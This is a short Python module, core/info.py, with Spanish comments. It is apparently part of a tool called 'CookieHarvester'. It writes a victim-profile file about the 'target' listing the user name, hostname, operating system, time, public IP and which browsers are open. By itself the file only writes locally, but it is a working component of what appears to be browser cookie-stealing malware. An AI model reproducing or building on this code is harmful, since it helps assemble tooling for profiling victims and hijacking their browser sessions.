#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
core/info.py
- Crea un archivo info.txt con datos del objetivo.
- Solo se escribe en el archivo.
"""

import sys
import socket
import getpass
from datetime import datetime


def crear_info_txt(destino, ip_publica, VERSION, navegadores_abiertos, navegador_nombre):
    """
    Crea un archivo info.txt con información del objetivo.
    """
    with open(destino, 'w') as f:
        f.write("=" * 50 + "\n")
        f.write(f"  CookieHarvester {VERSION} - Información del objetivo\n")
        f.write("=" * 50 + "\n")
        f.write(f"Usuario: {getpass.getuser()}\n")
        f.write(f"Equipo: {socket.gethostname()}\n")
        f.write(f"Sistema: {sys.platform}\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"IP Pública: {ip_publica}\n")
        f.write(f"Navegador: {navegador_nombre}\n")
        f.write(
            f"Navegadores abiertos: "
            f"{', '.join(navegadores_abiertos) if navegadores_abiertos else 'Ninguno'}\n"
        )